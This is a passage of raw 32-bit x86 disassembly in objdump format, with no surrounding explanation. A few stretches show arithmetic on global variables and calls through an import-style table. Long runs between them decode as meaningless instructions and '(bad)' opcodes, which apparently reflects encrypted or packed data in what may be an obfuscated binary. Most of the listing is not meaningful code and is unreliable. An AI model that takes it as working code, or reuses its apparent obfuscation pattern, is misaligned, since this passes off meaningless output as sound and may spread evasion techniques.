  4021bb:	add    DWORD PTR ds:0x42828f,0x168f
  4021c5:	sub    DWORD PTR ds:0x428333,0x4281d3
  4021cf:	or     DWORD PTR ds:0x4283d3,0xa53
  4021d9:	mov    eax,ds:0x428287
  4021de:	xor    DWORD PTR ds:0x42819b,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0xbeee523a
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi-0x7e7e7ee],bl
  40220e:	div    BYTE PTR [edi-0x8]
  402211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402212:	jmp    0x4021cd
  402214:	dec    ebp
  402215:	dec    ebp
  402216:	es scas al,BYTE PTR es:[edi]
  402218:	mov    edx,0xcd799c41
  40221d:	test   DWORD PTR [eax+0x1f],ecx
  402220:	or     ebx,0x2c868e98
  402226:	std    
  402227:	xor    eax,0xeb8acd3a
  40222c:	sub    DWORD PTR [ebx+0x18f28837],ebx
  402232:	int    0x44
  402234:	mov    esi,esp
  402236:	ss mov ch,0x36
  402239:	xchg   esi,eax
  40223a:	pop    eax
  40223b:	cmp    bh,ah
  40223d:	cli    
  40223e:	(bad)  
  40223f:	push   esi
  402240:	sub    edi,eax
  402242:	enter  0x8292,0xf5
  402246:	push   es
  402247:	mov    ecx,0x16d705e7
  40224c:	popa   
  40224d:	ret    0x5f04
  402250:	cmc    
  402251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402252:	mov    ch,BYTE PTR [edx+0x1c938e1]
  402258:	lds    esp,FWORD PTR [ecx+0x45]
  40225b:	aam    0xf6
  40225d:	xchg   ecx,eax
  40225e:	ds cs push edi
  402261:	inc    ebx
  402262:	add    al,0x3
  402264:	jne    0x40223b
  402266:	adc    DWORD PTR [ecx],edi
  402268:	fwait
  402269:	or     eax,0x25750bc5
  40226e:	(bad)  
  40226f:	xor    al,0x17
  402271:	loope  0x402266
  402273:	fdivr  QWORD PTR [ebp-0x49]
  402276:	and    BYTE PTR [edx],dh
  402278:	or     DWORD PTR [edx],0x2b84c0b1
  40227e:	test   al,0x7d
  402280:	push   ebx
  402281:	scas   al,BYTE PTR es:[edi]
  402282:	mov    ds:0x9013fe57,al
  402287:	inc    edi
  402288:	stos   DWORD PTR es:[edi],eax
  402289:	or     ebp,DWORD PTR [esi+ecx*4-0x30]
  40228d:	push   esp
  40228e:	xor    ch,BYTE PTR [esi-0x44]
  402291:	mov    bl,0x69
  402293:	fstp   QWORD PTR [esi+0x1f]
  402296:	push   0x66e50fa7
  40229b:	inc    esi
  40229c:	fistp  DWORD PTR [ebx]
  40229e:	cmp    DWORD PTR [edi],ecx
  4022a0:	scas   al,BYTE PTR es:[edi]
  4022a1:	leave  
  4022a2:	and    bh,ch
  4022a4:	add    bl,BYTE PTR [ecx]
  4022a6:	jbe    0x40225b
  4022a8:	jb     0x402231
  4022aa:	in     eax,0x7f
  4022ac:	push   edi
  4022ad:	dec    edx
  4022ae:	rcl    DWORD PTR [edx+eiz*2+0x1f6d4f7],0x56
  4022b6:	dec    ecx
  4022b7:	adc    al,0x4d
  4022b9:	and    esp,DWORD PTR [edi+0x30]
  4022bc:	ins    DWORD PTR es:[edi],dx
  4022bd:	cmc    
  4022be:	mov    ah,0xf2
  4022c0:	stc    
  4022c1:	sti    
  4022c2:	aas    
  4022c3:	rol    BYTE PTR [edx+ebp*2],1
  4022c6:	push   es
  4022c7:	jbe    0x4022ea
  4022c9:	xlat   BYTE PTR ds:[ebx]
  4022ca:	in     al,dx
  4022cb:	mov    esp,0x29c16bb4
  4022d0:	xlat   BYTE PTR ds:[ebx]
  4022d1:	call   0x88f9e070
  4022d6:	and    al,0x91
  4022d8:	sub    DWORD PTR [esi],ebx
  4022da:	(bad)  
  4022db:	ss add esp,esi
  4022de:	push   0x61
  4022e0:	out    dx,eax
  4022e1:	aaa    
  4022e2:	jno    0x4022cd
  4022e4:	dec    edx
  4022e5:	adc    dh,BYTE PTR [edi-0x7a]
  4022e8:	lods   eax,DWORD PTR ds:[esi]
  4022e9:	fst    DWORD PTR [ebp+0x51]
  4022ec:	ds mov dl,0x94
  4022ef:	ret    0x2c3e
  4022f2:	pop    esi
  4022f3:	loopne 0x4022ae
  4022f5:	mov    bl,0xb7
  4022f7:	cmp    DWORD PTR [ebx+0x47],esp
  4022fa:	sti    
  4022fb:	test   eax,0x4f873d25
  402300:	jge    0x40234b
  402302:	shl    BYTE PTR [edx+0x3e5e68fc],cl
  402308:	push   edx
  402309:	push   cs
  40230a:	cwde   
  40230b:	xchg   esi,eax
  40230c:	adc    eax,0xef87385
  402311:	cmp    cl,BYTE PTR [bx+si]
  402314:	stc    
  402315:	mov    esi,0x4186f517
  40231a:	je     0x4022d9
  40231c:	mov    ebp,DWORD PTR [eax+0x1d73c7fe]
  402322:	cmp    DWORD PTR [edi],eax
  402324:	add    DWORD PTR [eax],ebx
  402326:	loop   0x402392
  402328:	jmp    0xd6a4c7db
  40232d:	xchg   DWORD PTR [esi-0x6af0601b],edx
  402333:	pushf  
  402334:	retf   
  402335:	mul    DWORD PTR [ebx+esi*1+0x1e]
  402339:	or     BYTE PTR [esi+0x12],cl
  40233c:	jo     0x40238e
  40233e:	lods   al,BYTE PTR ds:[esi]
  40233f:	dec    ecx
  402340:	xor    eax,DWORD PTR [eax+0x591784f9]
  402346:	jle    0x402333
  402348:	data16 clc 
  40234a:	daa    
  40234b:	sub    al,BYTE PTR [edx-0x5826da38]
  402351:	leave  
  402352:	repz fsubr DWORD PTR [ecx]
  402355:	std    
  402356:	sub    BYTE PTR [ebp-0x31],dh
  402359:	in     al,dx
  40235a:	lahf   
  40235b:	imul   ebp,DWORD PTR [edi+0x34],0x2ba31446
  402362:	jb     0x4023b7
  402364:	jb     0x40234b
  402366:	(bad)  
  402368:	enter  0x2d4e,0xeb
  40236c:	sar    BYTE PTR [ebx+0xb31aa68],cl
  402372:	xlat   BYTE PTR ds:[ebx]
  402373:	ja     0x4022f5
  402375:	dec    esi
  402376:	aam    0x2e
  402378:	push   cs
  402379:	sbb    DWORD PTR [ecx+eiz*4-0x70],0xb11186fe
  402381:	js     0x40234b
  402383:	push   0xf4d583d0
  402388:	cmc    
  402389:	aad    0xfb
  40238b:	(bad)  
  40238c:	jo     0x40237a
  40238e:	inc    ebx
  40238f:	jmp    0x402317
  402391:	test   DWORD PTR [eax-0x4adc338b],eax
  402397:	dec    esp
  402398:	pusha  
  402399:	xchg   edx,eax
  40239a:	into   
  40239b:	pop    edx
  40239c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40239d:	aam    0xc7
  40239f:	dec    edi
  4023a0:	adc    DWORD PTR [edx],esp
  4023a2:	inc    ebx
  4023a3:	test   eax,0x11fa40b2
  4023a8:	stc    
  4023a9:	mov    ds:0x11f511c7,al
  4023ae:	mov    al,ds:0x965a98c8
  4023b3:	cmc    
  4023b4:	jmp    0x70c3e6cd
  4023b9:	pop    edx
  4023ba:	mul    BYTE PTR [edx-0x607066bb]
  4023c0:	pushf  
  4023c1:	and    DWORD PTR [ecx+0x4b228659],esp
  4023c7:	xlat   BYTE PTR ds:[ebx]
  4023c8:	out    0x8b,al
  4023ca:	xor    DWORD PTR [edi-0xf],ebx
  4023cd:	(bad)  
  4023ce:	xlat   BYTE PTR ds:[ebx]
  4023cf:	js     0x40238a
  4023d1:	pop    ss
  4023d2:	dec    eax
  4023d3:	adc    eax,0xe752b73
  4023d8:	inc    esp
  4023d9:	(bad)  
  4023da:	lea    ecx,ds:0x44e596fe
  4023e0:	or     dh,BYTE PTR [edi-0x65901f2a]
  4023e6:	dec    edx
  4023e7:	sub    DWORD PTR [edx],edx
  4023e9:	push   edi
  4023ea:	rcl    ebx,0x7c
  4023ed:	sbb    BYTE PTR [esi+0x693fa13f],0xfb
  4023f4:	or     al,BYTE PTR [ebx+0x43959093]
  4023fa:	pop    ebp
  4023fb:	jno    0x402410
  4023fd:	sub    al,0x93
  4023ff:	lea    edi,ds:0x538a655e
  402405:	mov    ebx,0x926b9d0
  40240a:	inc    esp
  40240b:	fisttp QWORD PTR [edi-0x677e1d4b]
  402411:	lods   eax,DWORD PTR ds:[esi]
  402412:	lahf   
  402413:	sub    edi,DWORD PTR [eax-0x4afd3006]
  402419:	dec    ecx
  40241a:	adc    al,0x1d
  40241c:	out    dx,al
  40241d:	or     al,0xe0
  40241f:	mov    ebx,0xdbc4b883
  402424:	jle    0x4023b3
  402426:	xor    eax,0xd5001374
  40242b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40242d:	add    BYTE PTR [edi],dh
  40242f:	in     al,dx
  402430:	adc    al,0xa6
  402432:	lock add edx,esi
  402435:	and    DWORD PTR [eax+0x7582533],0x1
  40243c:	mov    ah,0xde
  40243e:	mov    eax,ds:0xce29b8b6
  402443:	(bad)  
  402444:	clc    
  402445:	outs   dx,DWORD PTR ds:[esi]
  402446:	sbb    BYTE PTR [edi+0xfcfcf05],0x9b
  40244d:	cmp    BYTE PTR [esi],cl
  40244f:	ja     0x4023e2
  402451:	mov    DWORD PTR [eax+ebx*2],ebx
  402454:	(bad)  [edi]
  402456:	das    
  402457:	js     0x4023f1
  402459:	in     al,0xa6
  40245b:	jecxz  0x40242e
  40245d:	or     eax,0x4f95959e
  402462:	and    bh,ch
  402464:	jl     0x402485
  402466:	jmp    0x40243d
  402468:	push   ecx
  402469:	aas    
  40246a:	xchg   BYTE PTR [esi],al
  40246c:	fmul   DWORD PTR [esi]
  40246e:	mov    ah,0x77
  402470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402471:	xor    esp,DWORD PTR [ebx]
  402473:	les    edi,FWORD PTR [eax-0x5b]
  402476:	add    eax,0xb71b4cb9
  40247b:	xchg   DWORD PTR [ebp+0x7e707a34],esp
  402481:	ret    0x1dc1
  402484:	add    esi,esp
  402486:	fisttp DWORD PTR [edx]
  402488:	mov    esp,0x32b7f142
  40248d:	pop    ds
  40248e:	mov    bl,0x55
  402490:	xchg   esi,eax
  402491:	xor    BYTE PTR [eax],bh
  402493:	sbb    ah,BYTE PTR ds:0x202126b4
  402499:	fnstcw WORD PTR es:[edi+eax*1+0x44]
  40249e:	imul   ebx,DWORD PTR [ebp-0x12f2aeb9],0xffffffbc
  4024a5:	mov    ebx,DWORD PTR [ebp+0x1d]
  4024a8:	aad    0x58
  4024aa:	xor    al,0x7
  4024ac:	enter  0xa66e,0xc3
  4024b0:	or     al,0xfe
  4024b2:	aam    0xab
  4024b4:	add    esi,DWORD PTR [ecx-0x46025865]
  4024ba:	push   ebp
  4024bb:	jno    0x402504
  4024bd:	push   ss
  4024be:	inc    ecx
  4024bf:	into   
  4024c0:	cmp    BYTE PTR [edi+0x0],0x7
  4024c4:	inc    edi
  4024c5:	pusha  
  4024c6:	inc    esi
  4024c7:	(bad)  
  4024c8:	pop    edx
  4024c9:	mov    bl,0x4b
  4024cb:	xor    edi,0x68d8d4c7
  4024d1:	addr16 call 0x5055:0x311e9ee
  4024d9:	dec    eax
  4024da:	pop    ebp
  4024db:	scas   al,BYTE PTR es:[edi]
  4024dc:	ins    DWORD PTR es:[edi],dx
  4024dd:	retf   0xece3
  4024e0:	bound  ebx,QWORD PTR [ebp+0x41825ca2]
  4024e6:	lods   eax,DWORD PTR ds:[esi]
  4024e7:	xor    BYTE PTR [eax-0x46],dl
  4024ea:	inc    esp
  4024eb:	leave  
  4024ec:	jp     0x402569
  4024ee:	loop   0x4024ac
  4024f0:	xchg   esp,eax
  4024f1:	ds jne 0x40253a
  4024f4:	cdq    
  4024f5:	in     eax,dx
  4024f6:	mov    esp,DWORD PTR [ebx]
  4024f8:	scas   al,BYTE PTR es:[edi]
  4024f9:	inc    esp
  4024fa:	add    eax,0xe15745ed
  4024ff:	push   eax
  402500:	push   cs
  402501:	mov    eax,0x21dc8b1a
  402506:	in     al,dx
  402507:	or     ch,BYTE PTR [ecx-0x539955df]
  40250d:	dec    edi
  40250e:	sbb    al,bl
  402510:	pop    edx
  402511:	lea    edx,[esi+0x1a]
  402514:	repz lds eax,FWORD PTR gs:[ebx+0x70f634cc]
  40251c:	in     eax,0xfa
  40251e:	xor    esp,eax
  402520:	fcmovu st,st(7)
  402522:	les    ebx,FWORD PTR [ecx+0x72]
  402525:	inc    eax
  402526:	dec    ebx
  402527:	es daa 
  402529:	arpl   di,sp
  40252b:	push   ebp
  40252c:	cli    
  40252d:	sub    al,BYTE PTR [ebp-0x793fd9fe]
  402533:	add    eax,0x81e0a1d8
  402538:	rcl    DWORD PTR [eax-0x7a04626],cl
  40253e:	dec    ecx
  40253f:	jge    0x4024d4
  402541:	mov    edi,0x33768dfe
  402546:	fild   QWORD PTR [esi]
  402548:	rcl    BYTE PTR [eax],cl
  40254a:	inc    edi
  40254b:	add    BYTE PTR [eax+edx*1+0x22],dl
  40254f:	mov    cl,BYTE PTR [esi+ecx*2+0x2d]
  402553:	fcom   QWORD PTR [eax-0x72]
  402556:	push   ss
  402557:	xchg   cl,dl
  402559:	adc    eax,0xb9518df6
  40255e:	cmp    eax,0xc4cf2e5d
  402563:	fdivr  DWORD PTR [ebx]
  402565:	in     al,0xef
  402567:	mov    edx,DWORD PTR [edx]
  402569:	cld    
  40256a:	ins    DWORD PTR es:[edi],dx
  40256b:	(bad)  
  40256c:	pop    esi
  40256d:	mov    ebp,0x51ca509b
  402572:	and    esp,ebp
  402574:	jne    0x40255d
  402576:	test   al,0x91
  402578:	mov    eax,ds:0x1528132f
  40257d:	vcmpps ymm5,ymm6,YMMWORD PTR [edi],0x81
  402582:	inc    eax
  402583:	pop    ecx
  402584:	ins    DWORD PTR es:[edi],dx
  402585:	mov    al,0x81
  402587:	mov    ah,0x2
  402589:	sahf   
  40258a:	xor    al,BYTE PTR [esi-0x36c3d989]
  402590:	mov    dh,0x5f
  402592:	in     al,0xdb
  402594:	jb     0x40254e
  402596:	cwde   
  402597:	addr16 inc ebp
  402599:	fadd   st(0),st
  40259b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40259c:	xchg   ebp,eax
  40259d:	and    cl,ah
  40259f:	aaa    
  4025a0:	sub    esp,ecx
  4025a2:	(bad)  
  4025a3:	int3   
  4025a4:	add    eax,0x34929c8b
  4025a9:	dec    edx
  4025aa:	fisubr WORD PTR [edi+0x43]
  4025ad:	sub    al,0xbe
  4025af:	mov    bh,ch
  4025b1:	ret    0xd248
  4025b4:	mov    ah,0xc5
  4025b6:	and    DWORD PTR [esp+eiz*4-0x1c],edi
  4025ba:	mov    dl,0xe4
  4025bc:	cmp    BYTE PTR [ecx+0x4f],al
  4025bf:	pop    edi
  4025c0:	(bad)  
  4025c1:	push   ds
  4025c2:	in     eax,0x67
  4025c4:	push   edx
  4025c5:	dec    ebp
  4025c6:	or     eax,0x4a114236
  4025cb:	out    0xae,al
  4025cd:	mov    ebx,0x729045c7
  4025d2:	cmp    eax,DWORD PTR [eax]
  4025d4:	add    BYTE PTR [edi],cl
  4025d6:	mov    bh,0x5
  4025d8:	aas    
  4025d9:	add    DWORD PTR [edx+0x0],0x11
  4025dd:	add    eax,0x4281cb
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x4281b3,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x4281a7,0x0
  4025fd:	mov    DWORD PTR ds:0x428353,0x76b5
  402607:	mov    DWORD PTR ds:0x4281af,edx
  40260d:	mov    DWORD PTR ds:0x4282c7,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x4282b3
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x4281a7,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x42827f
  402645:	call   DWORD PTR ds:0x428ddc
  40264b:	sbb    DWORD PTR ds:0x4283cb,0x36f
  402655:	adc    DWORD PTR ds:0x42834f,0x4281d7
  40265f:	sub    DWORD PTR ds:0x4283bf,0x42835b
  402669:	and    DWORD PTR ds:0x42819f,0x42828b
  402673:	add    DWORD PTR ds:0x42835f,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x4281a7
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x42819b,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x4282cf,0x0
  4026b7:	mov    DWORD PTR ds:0x42832f,edx
  4026bd:	mov    DWORD PTR ds:0x42828b,ecx
  4026c3:	mov    DWORD PTR ds:0x4281b3,edx
  4026c9:	mov    DWORD PTR ds:0x4282af,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x42819b
  4026dd:	mov    DWORD PTR ds:0x4282cf,edx
  4026e3:	cmp    DWORD PTR ds:0x4282cf,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428de0
  402708:	add    DWORD PTR ds:0x4282d7,0x428337
  402712:	sub    DWORD PTR ds:0x428353,0x6e4a
  40271c:	xor    DWORD PTR ds:0x4281ab,0x16a6
  402726:	dec    DWORD PTR ds:0x4281c7
  40272c:	and    DWORD PTR ds:0x4282ab,edx
  402732:	or     DWORD PTR ds:0x42833b,edx
  402738:	mov    eax,ds:0x4281cf
  40273d:	and    DWORD PTR ds:0x4283e3,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x4283e3
  402751:	sbb    DWORD PTR ds:0x4282af,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42828f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x428343
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0x673a1eaa
  4027a0:	mov    esp,0x1818fc30
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    BYTE PTR [ecx-0x29],ch
  4027ab:	push   edi
  4027ac:	fist   WORD PTR [eax]
  4027ae:	lea    edi,[edi+0x5a140fce]
  4027b4:	jns    0x4027d6
  4027b6:	mov    ds:0xf611ba68,al
  4027bb:	sub    dh,BYTE PTR [ecx]
  4027bd:	dec    esi
  4027be:	or     dl,BYTE PTR [ebx-0x6b]
  4027c1:	mov    dl,0x6a
  4027c3:	mov    ah,0x27
  4027c5:	imul   edx,DWORD PTR ds:0xa673800f,0xc33e7d39
  4027cf:	or     eax,DWORD PTR [ecx-0x5e7ca79c]
  4027d5:	dec    ebx
  4027d6:	pushw  cs
  4027d8:	cwde   
  4027d9:	pusha  
  4027da:	pop    ecx
  4027db:	ror    BYTE PTR [ebp+0x2702b8cf],1
  4027e1:	jmp    0xb06f:0x202f3ffc
  4027e8:	stos   BYTE PTR es:[edi],al
  4027e9:	pop    ss
  4027ea:	mov    eax,ds:0x2a2a3778
  4027ef:	(bad)  
  4027f0:	(bad)  
  4027f2:	loope  0x402859
  4027f4:	or     BYTE PTR ds:0x12cac93c,bh
  4027fa:	mov    ecx,0x42b255ac
  4027ff:	dec    edx
  402800:	clc    
  402801:	jne    0x402837
  402803:	and    al,BYTE PTR [ebx+0x8a0bdd9]
  402809:	dec    ebp
  40280a:	scas   eax,DWORD PTR es:[edi]
  40280b:	mov    ecx,0x77fad2dc
  402810:	nop
  402811:	add    al,0x3b
  402813:	and    BYTE PTR [ebp-0x6a],cl
  402816:	pop    ss
  402817:	lea    esi,[ebx]
  402819:	neg    BYTE PTR [ebp+0x48]
  40281c:	sbb    BYTE PTR [edx],al
  40281e:	in     eax,0xb5
  402820:	int    0x49
  402822:	mov    DWORD PTR [edx+0x41],ebp
  402825:	inc    edi
  402826:	xchg   ebp,eax
  402827:	popa   
  402828:	mov    al,ch
  40282a:	sub    ebp,DWORD PTR fs:[esi+0x2c]
  40282e:	outs   dx,DWORD PTR ds:[esi]
  40282f:	gs pusha 
  402831:	dec    esi
  402832:	rol    DWORD PTR [esi-0x79],0xb4
  402836:	pop    ebp
  402837:	cld    
  402838:	mov    ds:0x7c6695d4,eax
  40283d:	repnz in eax,dx
  40283f:	popa   
  402840:	jns    0x4027e6
  402842:	in     al,0x1c
  402844:	jge    0x4027fa
  402846:	mov    ch,0x2b
  402848:	(bad)  [ebp+0x40e02ac1]
  40284e:	sar    BYTE PTR [ebp-0x75],0xf
  402852:	(bad)  
  402853:	jecxz  0x402869
  402855:	xchg   edx,eax
  402856:	dec    ebx
  402857:	mov    al,ds:0x914228b
  40285c:	or     ebx,DWORD PTR [ecx-0x57a808ab]
  402862:	add    BYTE PTR [esi+0x34],bl
  402865:	ins    DWORD PTR es:[edi],dx
  402866:	cmp    BYTE PTR [edx+0x5aa1b48a],ch
  40286c:	sub    DWORD PTR [eax],ebp
  40286e:	ja     0x4028cb
  402870:	jmp    0x611b41
  402875:	jge    0x402869
  402877:	cdq    
  402878:	push   ebp
  402879:	pop    ds
  40287a:	xchg   edi,eax
  40287b:	adc    dh,BYTE PTR [ebx-0x48667c]
  402881:	aaa    
  402882:	xor    al,0x29
  402884:	int3   
  402885:	hlt    
  402886:	ret    0xacfd
  402889:	leave  
  40288a:	call   0xfbbd:0xeea84313
  402891:	bnd jbe 0x402825
  402894:	out    0x1a,al
  402896:	pop    edi
  402897:	add    BYTE PTR [edx+0x73475ad7],dh
  40289d:	jmp    0x4e23:0xdefef88e
  4028a4:	xchg   esp,eax
  4028a5:	lock inc ecx
  4028a7:	ins    BYTE PTR es:[edi],dx
  4028a8:	shl    DWORD PTR [edx+0x55],0x12
  4028ac:	std    
  4028ad:	gs sub edx,edi
  4028b0:	or     edi,DWORD PTR [ecx-0x40]
  4028b3:	das    
  4028b4:	mov    ah,0x28
  4028b6:	sbb    ecx,edi
  4028b8:	shr    ebx,0xd5
  4028bb:	and    BYTE PTR [ecx-0x6fdf2229],ch
  4028c1:	or     BYTE PTR [ecx],dh
  4028c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028c4:	push   es
  4028c5:	jae    0x402849
  4028c7:	inc    ecx
  4028c8:	dec    eax
  4028c9:	add    eax,0x7707d01f
  4028ce:	mov    al,0x1e
  4028d0:	cmp    edi,ebp
  4028d2:	mov    ebp,DWORD PTR [ebx]
  4028d4:	sub    esp,eax
  4028d6:	(bad)  
  4028d7:	cmp    dh,BYTE PTR [edi-0xbf20910]
  4028dd:	repnz scas eax,DWORD PTR es:[edi]
  4028df:	xor    DWORD PTR [edi-0x2bab546],esp
  4028e5:	xchg   ecx,eax
  4028e6:	in     eax,dx
  4028e7:	fisttp DWORD PTR [edi+0x2999e779]
  4028ed:	push   cs
  4028ee:	push   es
  4028ef:	aad    0x11
  4028f1:	lds    eax,FWORD PTR [edi+edx*2+0x15]
  4028f5:	adc    ebx,ebx
  4028f7:	pop    edi
  4028f8:	mov    esp,0xd2963df5
  4028fd:	repnz adc esp,DWORD PTR [esi+0x133162a9]
  402904:	(bad)  
  402905:	repz pusha 
  402907:	add    al,0x6e
  402909:	pusha  
  40290a:	push   edx
  40290b:	sqrtps xmm2,XMMWORD PTR [ecx+eax*1-0x7b]
  402910:	(bad)  
  402912:	addr16 jb 0x402990
  402915:	or     esp,ebp
  402917:	or     ecx,DWORD PTR [ecx+0x7a82e61f]
  40291d:	add    BYTE PTR [esi-0x41],dh
  402920:	adc    ecx,esp
  402922:	ins    DWORD PTR es:[edi],dx
  402923:	out    0x60,al
  402925:	xor    dh,BYTE PTR [ebx+0x593f9c3]
  40292b:	and    al,cl
  40292d:	sub    eax,ebx
  40292f:	pusha  
  402930:	dec    ebp
  402931:	call   0x3e97:0xa9ec2c5c
  402938:	jp     0x402996
  40293a:	add    eax,0x38d1bea
  40293f:	(bad)  
  402940:	xor    BYTE PTR [ecx],ch
  402942:	adc    DWORD PTR [ebp+0x7daf7933],ebx
  402948:	xchg   edx,eax
  402949:	push   ebx
  40294a:	es in  al,dx
  40294c:	call   0xda7:0xcaf40bd1
  402953:	pop    edx
  402954:	into   
  402955:	sbb    al,0xd4
  402957:	cli    
  402958:	inc    esp
  402959:	in     al,dx
  40295a:	test   BYTE PTR [ecx],al
  40295c:	retf   0xaacc
  40295f:	xchg   edx,eax
  402960:	adc    esi,DWORD PTR [edi-0x7f096049]
  402966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402967:	mov    bl,0x5
  402969:	mov    WORD PTR ds:0x80fc6381,gs
  40296f:	es xchg ebp,eax
  402971:	mov    edx,0x44465f95
  402976:	and    ecx,DWORD PTR [ecx+0xc]
  402979:	clc    
  40297a:	rcr    dh,cl
  40297c:	dec    eax
  40297d:	xchg   DWORD PTR [ecx+0x71],eax
  402980:	mov    cl,0x2c
  402982:	out    0xe0,al
  402984:	add    cl,BYTE PTR [ecx-0x2cf9e5d9]
  40298a:	xchg   edi,eax
  40298b:	xor    bl,al
  40298d:	or     al,0xd2
  40298f:	fwait
  402990:	fwait
  402991:	adc    eax,0x1fff6977
  402996:	xlat   BYTE PTR ds:[ebx]
  402997:	push   ebp
  402998:	clc    
  402999:	rcl    BYTE PTR [edi+edx*8],1
  40299c:	push   es
  40299d:	push   eax
  40299e:	sub    edx,DWORD PTR [edx-0x13]
  4029a1:	jno    0x4029ca
  4029a3:	(bad)  
  4029a4:	bndldx (bad),[ecx+0x5e64fe13]
  4029ab:	add    ecx,ebx
  4029ad:	cmp    DWORD PTR [ebx+edi*1-0x16],esi
  4029b1:	fld    st(4)
  4029b3:	scas   eax,DWORD PTR es:[edi]
  4029b4:	jl     0x4029dc
  4029b6:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4029b8:	mov    cl,0x2f
  4029ba:	xor    eax,0x711a099
  4029bf:	jg     0x4029ce
  4029c1:	xor    BYTE PTR [eax-0x1a],ah
  4029c4:	push   eax
  4029c5:	lods   eax,DWORD PTR ds:[esi]
  4029c6:	addr16 mov esp,0x65a9a2dc
  4029cc:	pop    eax
  4029cd:	adc    eax,0xc89d4049
  4029d2:	(bad)
  4029d5:	not    dl
  4029d7:	(bad)  
  4029d8:	cmp    eax,0x69c928a2
  4029dd:	add    eax,0x5526d0ff
  4029e2:	push   es
  4029e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029e4:	dec    ebp
  4029e5:	mov    ebx,0x72dc1ba2
  4029ea:	fild   QWORD PTR [eax-0x66]
  4029ed:	xchg   edx,eax
  4029ee:	inc    ecx
  4029ef:	fbld   TBYTE PTR [ebx+0x47]
  4029f2:	aad    0x36
  4029f4:	cmp    BYTE PTR [eax+eax*8-0x4c121df5],0x61
  4029fc:	arpl   WORD PTR [edx+esi*2-0x1e0503db],si
  402a03:	adc    eax,0x3a0c57d4
  402a08:	jne    0x402a25
  402a0a:	div    BYTE PTR ds:0x96f0dcb7
  402a10:	pop    eax
  402a11:	repz arpl WORD PTR [ebp-0x80],cx
  402a15:	cdq    
  402a16:	inc    edx
  402a17:	repnz jecxz 0x402a2a
  402a1a:	add    eax,0xc1e4f708
  402a1f:	jbe    0x402a44
  402a21:	mov    eax,0x6cbbf2e4
  402a26:	dec    ecx
  402a27:	and    BYTE PTR [ecx],bl
  402a29:	mov    ecx,0xd9912ec5
  402a2e:	mov    esi,ebp
  402a30:	(bad)  
  402a31:	push   esi
  402a32:	sti    
  402a33:	inc    ecx
  402a34:	add    DWORD PTR [edi],edi
  402a36:	(bad)  
  402a37:	jbe    0x402ab4
  402a39:	pop    ss
  402a3a:	in     eax,dx
  402a3b:	rol    BYTE PTR [eax],cl
  402a3d:	mov    ch,0x90
  402a3f:	mov    DWORD PTR [edx],esp
  402a41:	mov    ecx,ecx
  402a43:	mov    edx,0xa8ebdfb6
  402a48:	xchg   esp,eax
  402a49:	ja     0x402a76
  402a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a4c:	push   esp
  402a4d:	mov    ebx,DWORD PTR [edi+esi*4-0x66]
  402a51:	xor    eax,0xe4217f6d
  402a56:	(bad)  
  402a57:	sbb    DWORD PTR [ebp+0x12],ecx
  402a5a:	jecxz  0x402a13
  402a5c:	cld    
  402a5d:	push   esi
  402a5e:	and    BYTE PTR [esi-0x7c],0x6
  402a62:	retf   0x2f78
  402a65:	jae    0x402a08
  402a67:	cmp    BYTE PTR [edx-0x75],al
  402a6a:	xor    edi,DWORD PTR [esi]
  402a6c:	shl    BYTE PTR [esi],0x8f
  402a6f:	sub    esi,DWORD PTR ds:0x4abb262a
  402a75:	ret    0xfb45
